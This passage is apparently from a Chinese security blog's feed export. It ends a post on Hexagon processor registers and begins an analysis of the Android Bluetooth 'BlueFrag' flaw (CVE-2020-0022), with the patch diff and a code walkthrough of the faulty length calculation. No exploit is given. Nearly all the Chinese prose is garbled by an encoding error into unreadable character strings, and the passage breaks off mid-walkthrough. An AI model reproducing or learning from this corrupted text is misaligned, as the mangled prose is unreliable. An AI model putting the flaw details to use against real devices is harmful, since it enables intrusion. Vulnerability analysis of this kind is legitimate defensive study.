ˆkeyå¯„å­˜å™¨ Frame key registe"></a>æ ˆkeyå¯„å­˜å™¨ Frame key registe</h4><p>frame key register  ï¼ˆFRAMEKEYï¼‰å½“å®ƒä»¬å­˜å‚¨åœ¨è½¯ä»¶å †æ ˆä¸­æ—¶è¿”å›åœ°å€æ—¶ç”¨æ¥å­˜å‚¨ç”¨äºXORåŠ å¯†çš„å¯†é’¥å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R2 &#x3D; FRAMEKEY &#x2F;&#x2F; Get frame key register</span><br><span class="line">FRAMEKEY &#x3D; R1 &#x2F;&#x2F; Set frame key register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png"></a></p><h4 id="æ•°æ®åŒ…è®¡æ•°å¯„å­˜å™¨-Packet-count-registers"><a href="#æ•°æ®åŒ…è®¡æ•°å¯„å­˜å™¨-Packet-count-registers" class="headerlink" title="æ•°æ®åŒ…è®¡æ•°å¯„å­˜å™¨ Packet count registers"></a>æ•°æ®åŒ…è®¡æ•°å¯„å­˜å™¨ Packet count registers</h4><p>æ•°æ®åŒ…è®¡æ•°å¯„å­˜å™¨ï¼ˆPKTCOUNTLO-PKTCOUNTHIï¼‰å­˜å‚¨ä¸€ä¸ª64ä½å€¼ï¼Œå…¶ä¸­åŒ…å«è‡ªä¸Šæ¬¡å†™å…¥PKTCOUNTå¯„å­˜å™¨ä»¥æ¥æ‰§è¡Œçš„æŒ‡ä»¤æ•°æ®åŒ…çš„å½“å‰æ•°é‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; PKTCOUNTHI &#x2F;&#x2F; Get packet count (high)</span><br><span class="line">R8 &#x3D; PKTCOUNTLO &#x2F;&#x2F; Get packet count (low)</span><br><span class="line">R9:8 &#x3D; PKTCOUNT &#x2F;&#x2F; Get packet count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png"></a></p><h4 id="Qtimerå¯„å­˜å™¨"><a href="#Qtimerå¯„å­˜å™¨" class="headerlink" title="Qtimerå¯„å­˜å™¨"></a>Qtimerå¯„å­˜å™¨</h4><p>Qtimerå¯„å­˜å™¨ï¼ˆUTIMERLO-UTIMERHIï¼‰æä¾›å¯¹Qtimerå…¨å±€å‚è€ƒè®¡æ•°å€¼çš„è®¿é—®ã€‚ å®ƒä»¬ä½¿Hexagonè½¯ä»¶èƒ½å¤Ÿè¯»å–64ä½æ—¶é—´å€¼ï¼Œè€Œä¸å¿…æ‰§è¡Œæ˜‚è´µçš„AHBåŠ è½½ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UTIMERHI &#x2F;&#x2F; Get Qtimer reference count (high)</span><br><span class="line">R4 &#x3D; UTIMERLO &#x2F;&#x2F; Get Qtimer reference count (low)</span><br><span class="line">R5:4 &#x3D; UTIMER &#x2F;&#x2F; Get Qtimer reference count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexagon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0022 â€œBlueFragâ€æ¼æ´åˆ†æ</title>
      <link href="CVE-2020-0022-analysis.html"/>
      <url>CVE-2020-0022-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Androidè“ç‰™å­ç³»ç»Ÿâ€œBlueFragâ€æ¼æ´åˆ†æ"><a href="#Androidè“ç‰™å­ç³»ç»Ÿâ€œBlueFragâ€æ¼æ´åˆ†æ" class="headerlink" title="Androidè“ç‰™å­ç³»ç»Ÿâ€œBlueFragâ€æ¼æ´åˆ†æ"></a>Androidè“ç‰™å­ç³»ç»Ÿâ€œBlueFragâ€æ¼æ´åˆ†æ</h2><p>æ¼æ´ä½äºï¼šhci/src/packet_fragmenter.cc</p><h3 id="HCI-å±‚"><a href="#HCI-å±‚" class="headerlink" title="HCI å±‚"></a>HCI å±‚</h3><p>HCI å±‚ä½äºè“ç‰™åè®®æ ˆé«˜å±‚åè®®å’Œä½å±‚åè®®ä¹‹é—´ï¼Œæä¾›äº†å¯¹åŸºå¸¦æ§åˆ¶å™¨å’Œé“¾è·¯ç®¡ç†å™¨çš„å‘½ä»¤ä»¥åŠè®¿é—®è“ç‰™ç¡¬ä»¶çš„ç»Ÿä¸€æ¥å£æ–¹æ³•ï¼Œå…¶æ¥å£é€‚ç”¨äºBR/EDRæ§åˆ¶å™¨ã€BR/EDR/LEæ§åˆ¶å™¨ã€LEæ§åˆ¶å™¨ã€AMPæ§åˆ¶å™¨ï¼Œä¸åº•å±‚çš„ç»“æ„å…³ç³»å¦‚ä¸‹å›¾ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022501.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022501.png"></a></p><h4 id="HCI-åŒ…æ ¼å¼"><a href="#HCI-åŒ…æ ¼å¼" class="headerlink" title="HCI åŒ…æ ¼å¼"></a>HCI åŒ…æ ¼å¼</h4><p>HCIé€šè¿‡åŒ…çš„æ–¹å¼æ¥ä¼ é€æ•°æ®ã€å‘½ä»¤å’Œäº‹ä»¶çš„ï¼Œæ‰€æœ‰åœ¨ä¸»æœºå’Œä¸»æœºæ§åˆ¶å™¨ä¹‹é—´çš„é€šä¿¡éƒ½ä»¥åŒ…çš„å½¢å¼è¿›è¡Œã€‚åŒ…æ‹¬æ¯ä¸ªå‘½ä»¤çš„è¿”å›å‚æ•°éƒ½é€šè¿‡ç‰¹å®šçš„äº‹ä»¶åŒ…æ¥ä¼ è¾“ã€‚HCIæœ‰æ•°æ®ã€å‘½ä»¤å’Œäº‹ä»¶ä¸‰ç§ç±»å‹çš„åŒ…ã€‚å‘½ä»¤åŒ…COMMANDï¼ˆ0x01ï¼‰åªèƒ½ä»ä¸»æœºå‘å¾€ä¸»æœºæ§åˆ¶å™¨ï¼Œå…¶ä¸­æ•°æ®åŒ…æ˜¯åŒå‘çš„ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼šACLï¼ˆ0x02ï¼‰ã€SCOï¼ˆ0x03ï¼‰ï¼Œè€Œäº‹ä»¶åŒ…EVENTï¼ˆ0x04ï¼‰å§‹ç»ˆæ˜¯ä¸»æœºæ§åˆ¶å™¨å‘å‘ä¸»æœºçš„ã€‚ä¸»æœºå‘å‡ºçš„å¤§å¤šæ•°å‘½ä»¤åŒ…éƒ½ä¼šè§¦å‘ä¸»æœºæ§åˆ¶å™¨äº§ç”Ÿç›¸åº”çš„äº‹ä»¶åŒ…ä½œä¸ºå“åº”ï¼Œåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¼šæœ‰ä¸€ä¸ªå¥æŸ„ï¼Œç”¨äºè¯†åˆ«ä¸»æœºä¹‹é—´çš„é€»è¾‘é€šé“å’Œæ§åˆ¶å™¨ï¼Œå…±æœ‰ä¸‰ç§ç±»å‹çš„å¥æŸ„ï¼šè¿æ¥å¥æŸ„ã€é€»è¾‘é“¾è·¯å¥æŸ„å’Œç‰©ç†é“¾è·¯å¥æŸ„ã€‚</p><p>æ ¹æ®éœ€è¦ï¼Œè¿™é‡Œåªä»‹ç»ACLæ•°æ®åŒ…æ ¼å¼ï¼ŒACL æ•°æ®ç”¨äºä¸»æœºå’Œæ§åˆ¶å™¨ä¹‹é—´çš„éåŒæ­¥æ•°æ®äº¤æ¢ï¼Œå¦‚æ’­æ”¾éŸ³ä¹æ•°æ®çš„æ•°æ®åŒ…ï¼Œæ ¼å¼å¦‚ä¸‹å›¾ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022525.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022525.png" alt="img"></a></p><p>å­—æ®µè¯´æ˜ï¼š</p><table><thead><tr><th><strong>å­—æ®µ</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td><strong>Handle</strong></td><td>Connection_Handleç”¨äºåœ¨ä¸»æ§åˆ¶å™¨ä¸Šä¼ è¾“æ•°æ®åŒ…æˆ–æ®µã€‚</td></tr><tr><td><strong>PB  Flag</strong></td><td>åŒ…è¾¹ç•Œå’Œé€‚åº”èŒƒå›´ã€‚</td></tr><tr><td><strong>BC  Flag</strong></td><td>å¹¿æ’­æ ‡å¿—ã€‚</td></tr><tr><td><strong>Data  Total Length</strong></td><td>ä»¥å…«ä½ä½ç»„ä¸ºå•ä½çš„æ•°æ®é•¿åº¦ï¼ŒåŒ…å«é«˜å±‚åè®®dataã€‚</td></tr></tbody></table><p>å…¶ä¸­ PB FLAGS  æ˜¯æˆ‘ä»¬è¦æ³¨æ„çš„  ï¼Œè®¾ç½®ä¸º 00â€™b çš„æ—¶å€™ï¼Œä»£è¡¨ Host -&gt; Contoller çš„ L2CAP çš„é¦–åŒ…ã€‚è®¾ç½®ä¸º 01â€™b çš„æ—¶å€™ï¼Œä»£è¡¨ Host -&gt; Contoller æˆ–è€… Contoller -&gt; Host çš„ L2CAP çš„ç»­åŒ…ï¼ˆä¸­é—´çš„ï¼‰ã€‚è®¾ç½®ä¸º 10â€™b çš„æ—¶å€™ï¼Œä»£è¡¨ Contoller -&gt; Host çš„ L2CAP çš„é¦–åŒ…ã€‚</p><table><thead><tr><th>å­—æ®µ</th><th>è¡¨ç¤º</th></tr></thead><tbody><tr><td>00â€™b -&gt; 0</td><td>Host -&gt; Contoller çš„ L2CAP çš„é¦–åŒ…</td></tr><tr><td>01â€™b -&gt; 1</td><td>Host -&gt; Contoller æˆ–è€… Contoller -&gt; Host çš„ L2CAP çš„ç»­åŒ…</td></tr><tr><td>10â€™b -&gt; 2</td><td>è®¾ç½®ä¸º 10â€™b çš„æ—¶å€™ï¼Œä»£è¡¨ Contoller -&gt; Host çš„ L2CAP çš„é¦–åŒ…ã€‚</td></tr></tbody></table><h3 id="L2CAP-æ•°æ®åŒ…æ ¼å¼"><a href="#L2CAP-æ•°æ®åŒ…æ ¼å¼" class="headerlink" title="L2CAP æ•°æ®åŒ…æ ¼å¼"></a>L2CAP æ•°æ®åŒ…æ ¼å¼</h3><p>ä¸Šé¢æåˆ°äº† L2CAP ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯L2CAPå‘¢ï¼Ÿ</p><h4 id="åˆ†æ®µï¼ˆFragmentationï¼‰å’Œé‡ç»„ï¼ˆReassembly-ï¼‰"><a href="#åˆ†æ®µï¼ˆFragmentationï¼‰å’Œé‡ç»„ï¼ˆReassembly-ï¼‰" class="headerlink" title="åˆ†æ®µï¼ˆFragmentationï¼‰å’Œé‡ç»„ï¼ˆReassembly ï¼‰"></a>åˆ†æ®µï¼ˆFragmentationï¼‰å’Œé‡ç»„ï¼ˆReassembly ï¼‰</h4><p>è¿™é‡Œéœ€è¦æåŠä¸€ä¸‹ åˆ†æ®µä¸é‡ç»„</p><p>åˆ†æ®µæ˜¯å°†PDUåˆ†è§£æˆè¾ƒå°çš„éƒ¨åˆ†ï¼Œä»¥ä¾¿ä»L2CAPä¼ é€’åˆ°è¾ƒä½å±‚ã€‚é‡ç»„æ˜¯æ ¹æ®ä»ä¸‹å±‚ä¼ é€’æ¥çš„ç‰‡æ®µé‡ç»„PDUçš„è¿‡ç¨‹ã€‚åˆ†æ®µå’Œé‡ç»„å¯ä»¥åº”ç”¨äºä»»ä½•L2CAP PDUã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161312.png" title="image-20200214163251779" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161312.png" alt="image-20200214163251779"></a></p><p>æˆ‘ä»¬å¯ä»¥ç®€å•æŠŠ  L2CAP å½“æˆ HCI data payload</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161328.png" title="image-20200214163406198" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161328.png" alt="image-20200214163406198"></a> </p><h4 id="æ•°æ®åŒ…æ ¼å¼"><a href="#æ•°æ®åŒ…æ ¼å¼" class="headerlink" title="æ•°æ®åŒ…æ ¼å¼"></a>æ•°æ®åŒ…æ ¼å¼</h4><p>L2CAPæ˜¯åŸºäºåˆ†ç»„çš„ï¼Œä½†ä¹Ÿéµå¾ªä¿¡é“ä¼ è¾“çš„é€šä¿¡æ¨¡å‹ã€‚L2CAPæ”¯æŒçš„ä¿¡é“æœ‰ä¸¤ç§ï¼šé¢å‘è¿æ¥çš„ä¿¡é“å’Œé¢å‘æ— è¿æ¥çš„ä¿¡é“ã€‚åœ¨é¢å‘è¿æ¥çš„ä¿¡é“ä¸­ï¼ŒL2CAPæ•°æ®åŒ…çš„æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022552" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022552" alt="img"></a></p><p>æ•°æ®åŒ…ä¸­æ¯ä¸ªå­—æ®µçš„è¯´æ˜å¦‚ä¸‹æ‰€ç¤ºï¼š</p><table><thead><tr><th><strong>å­—æ®µ</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td><strong>Length</strong></td><td>2å­—èŠ‚ï¼Œè¡¨ç¤ºä¿¡æ¯æœ‰æ•ˆè´Ÿè½½çš„å¤§å°ï¼Œä¸åŒ…æ‹¬é•¿åº¦L2CAPå¤´ã€‚</td></tr><tr><td><strong>Channel  ID**</strong>ï¼ˆ**<strong>CID**</strong>ï¼‰**</td><td>2å­—èŠ‚ï¼Œç”¨äºæ ‡è¯†ç›®çš„ä¿¡é“çš„ç»ˆç«¯ã€‚é€šé“IDçš„èŒƒå›´ä¸æ­£åœ¨å‘é€æ•°æ®åŒ…çš„è®¾å¤‡ç›¸å…³ã€‚</td></tr><tr><td><strong>Information**</strong>ï¼ˆ**<strong>Payload**</strong>ï¼‰**</td><td>ä¿¡æ¯è´Ÿè½½ã€‚é•¿åº¦ä¸º0åˆ°65535å­—èŠ‚ã€‚</td></tr></tbody></table><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>CVE-2020-0022æ¼æ´ä½äºHCIå±‚ï¼Œæ¼æ´è¡¥ä¸ä»£ç ä½äºhci/src/packet_fragmenter.ccï¼ˆä»¥8.1.0_r33ä¸ºä¾‹ï¼‰ä¸­çš„reassemble_and_dispatch()å‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°æ˜¯ç”¨äºæ•°æ®åŒ…åˆ†ç‰‡çš„é‡ç»„ã€‚å¯¹äºè¿‡é•¿çš„ACLæ•°æ®åŒ…éœ€è¦è¿›è¡ŒåŒ…çš„é‡ç»„ï¼Œä¸»è¦æ˜¯æ ¹æ®ACLåŒ…ä¸­çš„PB Flagæ ‡å¿—ä½è¿›è¡Œé‡ç»„ï¼Œå¦‚æœå½“å‰æ˜¯èµ·å§‹éƒ¨åˆ†å¹¶ä¸”æ˜¯ä¸å®Œæ•´çš„ï¼Œåˆ™ç”Ÿæˆä¸€ä¸ªéƒ¨åˆ†åŒ…ï¼ˆpartial_packetï¼‰æ”¾åˆ°mapé‡Œï¼Œç­‰ä¸‹æ¬¡æ”¶åˆ°å®ƒçš„åç»­éƒ¨åˆ†è¿›è¡Œæ‹¼è£…ï¼Œæ‹¼è£…å®Œæ¯•åå°±åˆ†å‘å‡ºå»ã€‚è¯¦ç»†åˆ†æreassemble_and_dispatch()å‡½æ•°å¦‚ä¸‹ï¼š</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>clone ä¸€ä»½ä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://android.googlesource.com/platform/system/bt</span><br><span class="line"><span class="built_in">cd</span> bt </span><br><span class="line">checkout 771571</span><br></pre></td></tr></table></figure><p>å’±ä»¬å…ˆçœ‹ ä¸€çœ¼ patchï¼š</p><p><a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf^!/">https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf%5E%21/</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hci/src/packet_fragmenter.cc b/hci/src/packet_fragmenter.cc</span><br><span class="line">index 5036ed5..143fc23 100644</span><br><span class="line"><span class="comment">--- a/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="comment">+++ b/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="meta">@@ -221,7 +221,8 @@</span></span><br><span class="line">                  &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">                  &quot;Truncating.&quot;,</span><br><span class="line">                  __func__, partial_packet-&gt;len);</span><br><span class="line"><span class="deletion">-        packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</span></span><br><span class="line"><span class="addition">+        packet-&gt;len =</span></span><br><span class="line"><span class="addition">+            (partial_packet-&gt;len - partial_packet-&gt;offset) + packet-&gt;offset;</span></span><br><span class="line">         projected_offset = partial_packet-&gt;len;</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>å°† packet-&gt;len çš„å€¼åœ¨åŸæœ¬çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº† packet-&gt;offset</p><h3 id="code-review"><a href="#code-review" class="headerlink" title="code review"></a>code review</h3><p>ä»£ç å¤„ç†é€»è¾‘åœ¨ <code>reassemble_and_dispatch</code> å‡½æ•°é‡Œï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161342.png" title="image-20200214164211428" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161342.png" alt="image-20200214164211428"></a></p><p>é¦–å…ˆè¯»å–ç›¸å…³å˜é‡ï¼Œ handle å’Œ acl_length :</p><ul><li><p>handle  ç›¸å½“äºé“¾æ¥ seesion</p></li><li><p>acl_length åˆ™ä¸º Data Total Length è¿™æ˜¯åŒ…æ‹¬ header + data</p><p>131 è¡Œæ ¡éªŒ é•¿åº¦æ˜¯å¦åˆæ³•</p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161345.png" title="image-20200214164743418" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161345.png" alt="image-20200214164743418"></a></p><p>133 è¡Œ é€šè¿‡ handle è¯»å– boundary_flag ï¼Œå°±æ˜¯å‰æ–‡æåŠçš„ PB flag</p><p>136 è¡Œ åˆ¤æ–­ PB flag æ˜¯å¦ä¸º 2 ï¼Œå³ æ˜¯å¦ä¸º <strong>Contoller -&gt; Host</strong> çš„ L2CAP çš„é¦–åŒ…ï¼Œå¦‚æ˜¯åˆ™è¿›å…¥ if æ¡ä»¶åˆ†æ”¯</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161349.png" title="image-20200214165424356" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161349.png" alt="image-20200214165424356"></a></p><p>145 çš„åˆ†æ”¯åˆ™åˆ¤æ–­ packet æ˜¯å¦å·²ç»è¢«å¤„ç†è¿‡</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161354.png" title="image-20200214165740960" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161354.png" alt="image-20200214165740960"></a></p><p>156 è¡Œåˆ™åˆ¤æ–­  acl_length æ˜¯å¦æ­£å¸¸</p><p>ç„¶åç´§æ¥ç€è®¡ç®— full_length ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> full_length =</span><br><span class="line">    l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>L2cap_length ä¹Ÿæ˜¯ä» stream è¯»å–çš„</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161357.png" title="image-20200214165946945" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161357.png" alt="image-20200214165946945"></a></p><p>ä¸Šé¢æåŠäº† acl_lengthä¸ºData Total Lengthï¼Œè¯¥dataæ•°æ®åŸŸä¸­å­˜æ”¾ç€L2CAPæ•°æ®åŒ…åˆ†ç‰‡ï¼ˆä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªå®Œæ•´çš„L2CAPæ•°æ®åŒ…ï¼‰ åˆ™ l2cap_length æ˜¯ä¸€ä¸ªå®Œæ•´çš„L2CAPæ•°æ®åŒ…ä¸­payloadçš„é•¿åº¦ã€‚</p><p>æ‰€ä»¥ full_length = å®Œæ•´çš„L2CAPæ•°æ®åŒ…ä¸­çš„payloadçš„é•¿åº¦ + ä¸€ä¸ªL2CAPå¤´éƒ¨é•¿åº¦å’Œä¸€ä¸ªHCIå¤´éƒ¨é•¿åº¦</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161401.png" title="image-20200214170805275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161401.png" alt="image-20200214170805275"></a></p><p>168 è¡Œ åˆæ˜¯ä¸€æ¬¡æ•°æ®å¤§å°æ£€æŸ¥</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161404.png" title="image-20200214170947166" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161404.png" alt="image-20200214170947166"></a></p><p>177 è¡Œå¼€å§‹ï¼Œé€šè¿‡æ£€æŸ¥å¤§å° åˆ¤æ–­å½“å‰ packet æ˜¯å¦è¿˜æœ‰åç»­çš„åŒ…ï¼Œå¦‚æœæ²¡æœ‰å°±ç›´æ¥ <code>callbacks-&gt;reassembled(packet);</code>å¹¶è¿”å›</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161410.png" title="image-20200214171432668" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161410.png" alt="image-20200214171432668"></a></p><p>å¦‚æœæœ‰åç»­åŒ…ï¼Œåˆ™å¼€å§‹è¿›ä¸€æ­¥å¤„ç†</p><ul><li><p>åˆ†é…ä¸€å—å†…å­˜ï¼Œç”¨æ¥ packet æ•°æ®é‡ç»„</p></li><li><p>è®¾ç½®ä¸€äº›å˜é‡ï¼Œpartial_packet-&gt;event ã€ partial_packet-&gt;lenã€partial_packet-&gt;offset</p><p>å…¶ä¸­ï¼š<code>partial_packet-&gt;len = full_length;</code> ä»¥åŠ<code>partial_packet-&gt;offset = packet-&gt;len;</code></p><p>å°†partial_packet-&gt;lenè®¾ç½®ä¸ºfull_lengthï¼Œå°†partial_packet-&gt;offsetè®¾ç½®ä¸ºpacket-&gt;lenå³å½“å‰å¤´åŒ…packet-&gt;dataçš„é•¿åº¦</p></li><li><p>è°ƒç”¨memcpyï¼Œå°†å¤´åŒ…packetä¸­HCIæ•°æ®åŒ…æ•´ä½“æ‹·è´åˆ°partial_packetä¸­</p></li><li><p>æ›´æ–°acl_lengthä¸ºä¸€ä¸ªå®Œæ•´çš„L2CAPæ•°æ®åŒ…é•¿åº¦</p></li><li><p>200 è¡Œ å°†partial_packetå­˜æ”¾åˆ°å®¹å™¨ä¸­</p></li><li><p>æœ€å é‡Šæ”¾å½“å‰å¤´åŒ…packetï¼Œè¡¨ç¤ºå·²ç»å¤„ç†å®Œç¬¬ä¸€ä¸ªpacket</p></li></ul><p>å½“ä¸‹ä¸€ä¸ªåŒ…è¿‡æ¥ï¼Œä¸”ä¸æ˜¯é¦–åŒ…çš„æ—¶å€™ï¼Œå°±ä¼šè¿›å…¥åˆ°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161414.png" title="image-20200214171915985" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161414.png" alt="image-20200214171915985"></a></p><p>204 è¡Œè¿™ä¸ªåˆ†æ”¯</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161418.png" title="image-20200214172003177" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161418.png" alt="image-20200214172003177"></a></p><p>206 è¡Œï¼Œåˆ¤æ–­é€šè¿‡ handle åˆ¤æ–­å½“å‰åŒ…æ˜¯å¦æ˜¯ä¸€ä¸ªé“¾è·¯é‡Œçš„ï¼Œå¦åˆ™ drop</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161423.png" title="image-20200214173502465" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161423.png" alt="image-20200214173502465"></a></p><p>215 è¡Œï¼Œ  è®¾ç½® packet-&gt;offset ç­‰äº HCI_ACL_PRESMBLE_SIXE å³ç­‰äº4 ï¼Œæ­¤æ—¶ packet-&gt;offset å°±æŒ‡å‘äº†  data åŸŸ</p><p>216 è¡Œï¼Œ  å¼€å§‹è®¡ç®— projected_offset ,ç­‰äº partial_packet-&gt;offset ä¸ (packet-&gt;len - HCI_ACL_PREAMBLE_SIZE) ä¹‹å’Œï¼š</p><p>â€‹    æ­¤æ—¶</p><ul><li>projected_offsetä¸ºpartial_packet-&gt;offset</li><li>(packet-&gt;len - HCI_ACL_PREAMBLE_SIZE) ä¸º L2CAPæ•°æ®åŒ…åˆ†ç‰‡</li></ul><p>åˆ™ï¼Œprojected_offset ä¸º partial_packet-&gt;offset +  L2CAPæ•°æ®åŒ…åˆ†ç‰‡</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161425.png" title="image-20200214174007323" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161425.png" alt="image-20200214174007323"></a></p><p>æ¥ç€å°±æ˜¯é‡è¦çš„åœ°æ–¹äº†ï¼Œåˆ¤æ–­  projected_offset æ˜¯å¦å¤§äº partial_packet-&gt;len</p><p>projected_offset æ˜¯åˆšæ‰æ±‚å’Œçš„ç»“æœ ï¼Œ partial_packet-&gt;len åˆ™  full_lenght </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161429.png" title="image-20200214174315466" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161429.png" alt="image-20200214174315466"></a></p><p>å¦‚æœ projected_offset  å¤§äº partial_packet-&gt;len åˆ™è¿›è¡Œä¸€æ¬¡å‡æ³•è¿ç®—ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161434.png" title="image-20200214174406350" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161434.png" alt="image-20200214174406350"></a></p><p> packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</p><p> projected_offset = partial_packet-&gt;len;</p><p>é‡æ–°è®¾ç½®  packet-&gt;len ä¸ projected_offsetï¼Œpacket-&gt;lenä¸ºpartial_packetå‰©ä½™ç©ºé—´çš„é•¿åº¦ã€‚ç„¶åï¼Œå°†projected_offsetè®¾ç½®ä¸ºpartial_packet-&gt;len</p><p>å¦‚æœæ­¤æ—¶ <code>packet-&gt;len</code> çš„ç»“æœæ˜¯ä¸€ä¸ªå°çš„æ•°ï¼Œé‚£ä¹ˆåœ¨</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161439.png" title="image-20200214174600143" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161439.png" alt="image-20200214174600143"></a></p><p>228 